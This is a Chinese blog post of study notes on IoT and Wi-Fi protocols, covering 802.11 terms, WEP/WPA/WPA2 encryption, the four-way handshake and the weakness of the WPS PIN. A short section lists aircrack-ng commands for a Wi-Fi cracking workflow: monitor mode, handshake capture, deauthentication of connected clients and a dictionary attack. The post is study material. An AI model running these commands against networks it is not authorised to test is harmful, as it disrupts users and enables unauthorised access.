---
title: wifi协议
date: 2022-05-05 19:52:40
tags:
    - 协议
---

<!--more-->

# 物联网通信协议

通信协议分类：接入类协议 通信类协议

**接入类协议**：一般负责子网内设备间的组网及通信，市场上常见的有zigbee、蓝牙以及wifi协议等。

**通信类协议**：主要是运行在传统互联网TCP/IP协议之上的设备远程通讯协议，负责设备通过互联网进行数据交换及通信，例如GPRS/3G/4G等。

### wlan

​	之前上过学校的选修课路由交换技术，感觉与其中的vlan很相似。VLAN 的实现是在有线的基础上的，而 WLAN 是一种[无线局域网](https://so.csdn.net/so/search?q=无线局域网&spm=1001.2101.3001.7020)技术。

![image-20220505200638400](https://s2.loli.net/2022/05/06/iWqupLG1frz4VN7.png)

**wifi就是wlan的其中一种技术**。

# wifi协议

https://wenku.baidu.com/view/1df8be69cb50ad02de80d4d8d15abe23482f032d.html

Wifi采⽤的协议属于IEEE 802协议集。Wifi以802.11做为其⽹络层以下的协议。

### 相关术语

1. LAN：即局域⽹，是路由和主机组成的内部局域⽹，⼀般为有线⽹络。
2. WAN：即⼴域⽹，是外部⼀个更⼤的局域⽹。
3. WLAN（Wireless LAN，即⽆线局域⽹）：前⾯我们说过LAN是局域⽹，其实⼤多数指的是有线⽹络中的局域⽹，⽆线⽹络中的局域⽹，⼀般⽤WLAN。
4. AP（Access point的简称，即访问点，接⼊点）：是⼀个⽆线⽹络中的特殊节点，通过这个节点，⽆线⽹络中的其它类型节点可以和⽆线⽹络外部以及内部进⾏通信。这⾥，AP和⽆线路由都在⼀台设备上（即Cisco E3000）。
5. Station（⼯作站）：表⽰连接到⽆线⽹络中的设备，这些设备通过AP，可以和内部其它设备或者⽆线⽹络外部通信。
6. Assosiate：连接。如果⼀个Station想要加⼊到⽆线⽹络中，需要和这个⽆线⽹络中的AP关联（即Assosiate）。
7. SSID：⽤来标识⼀个⽆线⽹络，后⾯会详细介绍，我们这⾥只需了解，每个⽆线⽹络都有它⾃⼰的SSID。
8. BSSID：⽤来标识⼀个BSS，其格式和MAC地址⼀样，是48位的地址格式。⼀般来说，它就是所处的⽆线接⼊点的MAC地址。某种程度来说，它的作⽤和SSID类似，但是SSID是⽹络的名字，是给⼈看的，BSSID是给机器看的，BSSID类似MAC地址。
9.   BSS（Basic Service Set）：由⼀组相互通信的⼯作站组成，是802.11⽆线⽹络的基本组件。主要有两种类型的IBSS和基础结构型⽹络。IBSS⼜叫ADHOC，组⽹是临时的，通信⽅式为Station<->Station，这⾥不关注这种组⽹⽅式；我们关注的基础结构形⽹络，其通信⽅式是Station<->AP<->Station，也就是所有⽆线⽹络中的设备要想通信，都得经过AP。在⽆线⽹络的基础形⽹络中，最重要的两类设备：AP和Station。

无线网络的安全
--------------------------------------------------------
最早的IEEE 802.11采用的是**WEP加密方式**，WEP（Wired Equivalent Privacy）是采用名为RC4的RSA加密技术，由于它的密钥固定,初始向量仅为24位,算法强度并不算高；直到WIFI技术的产生，IEEE 802.11开始转变**使用WPA技术加密，采⽤新的TKIP算法**，但是这个时候更好的CCMP还没完成，所以先在WPA上⽤TKIP技术；后续发展**WPA2是WPA的第2个版本，采⽤CCMP加密协定**（在有些路由器等设备上设定加密协定或者加密算法的时候，可能会⽤类似AES之类的字眼替代CCMP）。所以WPA2+AES是安全性最强的。

## WPA四次握手

WPA的加密方式

https://blog.csdn.net/yigezzchengxuyuan/article/details/108062519?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default&utm_relevant_index=2

## air无线攻击套件命令（WIFI暴力破解）

1. 查看无线网卡名    iwconfig
2. 关掉占用网卡进程     airmon-ng check kill
3. 设置网卡为监听模式     airmon-ng start INTERFACE
4. 扫描附近wifi     airodump-ng INTERFACE
5. 监听制定路由器流量并保存到本地       airodump-ng -c CHANNEL --bssid AP_MAC -w FILENAME INTERFACE
6. 攻击路由器使连接设备断线重新连接  airplay-ng -0 50 -a AP_MAC [-c STA_AP]  INTERFACE
7. 使用字典对抓取到的握手包暴力破解        aircrack-ng -w PASSWORD.txt  FILENAME.cap



## WPS安全问题

WPS（WIFI Protected Setup）是WIFI保护设置的英文缩写，用于简化无线局域网安装及安全性能得配置工作。在WPS认证中PIN码是网络设备间获得接入的唯一要求，不需要其他身份识别方式，这就让暴力破解变得可行。

WPS PIN码的第8位数是一个校验和，因此暴力破解只需算出前7位，而在实施PIN的身份识别时，接入点实际上要找出这个PIN的前4位和后3位是否分别正确。

```
10^8——>10^7——>10^4+10^3
```

破解难度越来越容易。
